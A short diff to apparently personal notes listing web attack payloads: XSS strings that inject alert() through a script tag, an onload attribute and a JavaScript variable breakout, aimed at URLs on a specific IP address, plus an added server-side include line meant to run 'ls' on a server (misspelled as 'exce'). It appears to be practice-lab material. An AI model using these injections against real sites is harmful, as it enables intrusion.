@@ -3,6 +3,10 @@
 XSS
 <script>alert('blabla')</script>
 
+#open a cmd and entre a command on a server using a injiection
+
+<!--#exce cmd='ls ../-->
+
 92.60.14.134:8081/xss/iframe3?path=asdfasdf" onload="alert('blabla')
 
 http://92.60.14.134:8081/xss/jsvar1?count=99%22);alert(2);//
